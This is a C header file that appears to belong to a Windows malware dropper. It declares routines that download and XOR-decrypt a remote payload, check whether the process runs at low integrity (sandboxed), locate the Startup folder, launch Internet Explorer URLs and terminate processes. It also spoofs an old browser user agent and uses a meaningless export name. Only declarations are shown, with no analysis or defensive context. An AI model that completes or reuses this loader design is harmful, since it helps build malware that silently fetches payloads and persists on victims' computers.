#ifndef _SOURCE_H
#define _SOURCE_H

#define PSAPI_VERSION 1
#pragma comment(linker, "/subsystem:console")
#pragma comment(lib, "shlwapi")
#pragma comment(lib, "wininet")

#include <Windows.h>
#include <Shlobj.h>
#include <Shlwapi.h>
#include <Wininet.h>
#include <Iepmapi.h>

typedef BOOL (WINAPI *MYEXPORT)(LPDWORD);
typedef HRESULT (WINAPI *SHGetKnownFolderPath_p)(__in REFKNOWNFOLDERID rfid, __in DWORD dwFlags, __in HANDLE hToken, __out PWSTR *ppszPath);
typedef HRESULT (WINAPI *IELaunchURL_p)(__in LPCWSTR pszUrl, __in LPPROCESS_INFORMATION pProcInfo, __in LPIELAUNCHURLINFO lpInfo);
typedef NTSTATUS (WINAPI *ZwTerminateProcess_p)(__in HANDLE ProcessHandle, __in NTSTATUS ExitStatus);


#define USER_AGENT L"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
//#define EXPORT_NAME "?qwopfnch@@YGHPAK@Z"
#define EXPORT_NAME "qwopfnch"

BOOL IsLowIntegrity();
BOOL PathExists(__in LPWSTR strPath);
LPWSTR GetStartupPath();
LPWSTR GetLowIntegrityTemp(BOOL bLowIntegrity);
LPBYTE DownloadAndDecrypt(__in LPWSTR strUrl, __in LPDWORD dwFileLen, __in DWORD dwXorKey, BOOL bXored);
BOOL DownloadFile(__in HINTERNET hUrl, __in LPBYTE lpBuffer, __in DWORD dwBufferLen);
LPBYTE Decrypt(__in LPBYTE lpBuffer, __in DWORD dwBuffLen, __in DWORD dwXorKey);




#endif //_SOURCE_H